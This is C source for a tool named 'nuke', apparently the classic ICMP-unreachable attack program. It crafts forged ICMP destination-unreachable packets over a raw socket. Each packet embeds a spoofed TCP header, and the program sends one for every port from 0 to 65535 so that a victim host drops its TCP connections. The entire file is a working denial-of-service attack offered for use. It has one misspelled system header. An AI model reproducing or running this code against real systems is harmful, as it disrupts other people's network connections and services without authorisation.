#include <netdb.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/in_system.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/tcp.h>
#include <signal.h>
#include <errno.h>
#include <string.h>
#include <stdio.h>

#define DEFAULT_UNREACH ICMP_UNREACH_PORT
char *icmp_unreach_type[] = { "net", "host", "protocol", "port", "frag", "source",
			      "destnet", "desthost","isolated", "authnet", "authhost",
			      "netsvc", "hostsvc" };

#define MAX_ICMP_UNREACH (sizeof(icmp_unreach_type)/sizeof(char *))

int resolve_unreach_type(arg)
char *arg;
{
    int i;
    for (i=0; i <MAX_ICMP_UNREACH;i++){
	if (!strcmp(arg,icmp_unreach_type[i])) return i;
    }
    return -1;
}

int resolve_host (host,sa)
char *host;
struct sockaddr_in *sa;
{
    struct hostent *ent ;
    bzero(sa,sizeof(struct sockaddr));
    sa->sin_family = AF_INET;
    if (inet_addr(host) == -1) {
	ent = gethostbyname(host);
	if (ent != NULL) {
	    sa->sin_family = ent->h_addrtype;
	    bcopy(ent->h_addr,(caddr_t)&sa->sin_addr,ent->h_length);
	    return(0);
	}
	else {
	    fprintf(stderr,"error: unknown host %s\n",host);
	    return(-1);
	}
    }
    return(0);
}

in_cksum(addr, len) /* from ping.c */
u_short *addr;
int len;
{
    register int nleft = len;
    register u_short *w = addr;
    register int sum = 0;
    u_short answer = 0;
/*
 * Our algorithm is simple, using a 32 bit accumulator (sum),
 * we add sequential 16 bit words to it, and at the end, fold
 * back all the carry bits from the top 16 bits into the lower
 * 16 bits.
 */
    while( nleft > 1 ) {
	sum += *w++;
	nleft -= 2;
    }

/* mop up an odd byte, if necessary */
    if( nleft == 1 ) {
	*(u_char *)(&answer) = *(u_char *)w ;
	sum += answer;
    }

/*
 * add back carry outs from top 16 bits to low 16 bits
 */
    sum = (sum >> 16) + (sum & 0xffff); /* add hi 16 to low 16 */
    sum += (sum >> 16); /* add carry */
    answer = ~sum; /* truncate to 16 bits */
    return (answer);
}

int icmp_unreach(host,uhost,port,sport,type)
char *host,*uhost;
int type,port;
{
    struct sockaddr_in name;
    struct sockaddr dest,uspoof;
    struct icmp *mp;
    struct tcphdr *tp;
    struct protoent *proto;
    int i,jj,s,rc;
    char *buf = (char *) malloc(sizeof(struct icmp)+64);

    mp = (struct icmp *) buf;
    if (resolve_host(host,&dest) <0) return(-1);
    if (resolve_host(uhost,&uspoof) <0) return(-1);
    if ((proto = getprotobyname("icmp")) == NULL) {
	fputs("unable to determine protocol number of \"icmp\n",stderr);
	return(-1);
    }
    if ((s = socket(AF_INET,SOCK_RAW,proto->p_proto)) <0 ) {
	perror("opening raw socket");
	return(-1);
    }

/* Assign it to a port */
    name.sin_family = AF_INET;
    name.sin_addr.s_addr = INADDR_ANY;
    name.sin_port = htons(port);

/* Bind it to the port */
    rc = bind(s, (struct sockaddr *) & name, sizeof(name));
    if (rc == -1) {
	perror("bind");
	return(-1);
    }
    for (jj=0; jj <= 65535; jj++)
    {
	if ((proto = getprotobyname("tcp")) == NULL) {
	    fputs("unable to determine protocol number of \"icmp\n",stderr);
	    return(-1);
	}

/* the following messy stuff from Adam Glass (icmpsquish.c) */
	bzero(mp,sizeof(struct icmp)+64);
	mp->icmp_type = ICMP_UNREACH;
	mp->icmp_code = type;
	mp->icmp_ip.ip_v = IPVERSION;
	mp->icmp_ip.ip_hl = 5;
	mp->icmp_ip.ip_len = htons(sizeof(struct ip)+64+20);
	mp->icmp_ip.ip_p = IPPROTO_TCP;
	mp->icmp_ip.ip_src = ((struct sockaddr_in *) &dest)->sin_addr;
	mp->icmp_ip.ip_dst = ((struct sockaddr_in *) &uspoof)->sin_addr;
	mp->icmp_ip.ip_ttl = 179;
	mp->icmp_cksum = 0;
	tp = (struct tcphdr *) ((char *) &mp->icmp_ip+sizeof(struct ip));
	tp->th_sport = sport;
	tp->th_dport = htons(jj);
	tp->th_seq = htonl(0x275624F2);
	mp->icmp_cksum = htons(in_cksum(mp,sizeof(struct icmp)+64));
	if ((i= sendto(s,buf,sizeof(struct icmp)+64, 0,&dest,sizeof(dest))) <0 ) {
	    perror("sending icmp packet");
	    return(-1);
	}
    }
    return(0);
}

void main(argc,argv)
int argc;
char **argv;
{
    int i, j, type;

    if ((argc <5) || (argc >6)) {
	fprintf(stderr,"usage: nuke host uhost port sport [unreach_type]\n");
	exit(1);
    }

    if (argc == 5) type = DEFAULT_UNREACH;
    else type = resolve_unreach_type(argv[5]);

    if ((type <0) ||(type >MAX_ICMP_UNREACH)) {
	fputs("invalid unreachable type",stderr);
	exit(1);
    }

    if (icmp_unreach(argv[1],argv[2],atoi(argv[3]),atoi(argv[4]),type) <0) exit(1);
    exit(0);
}
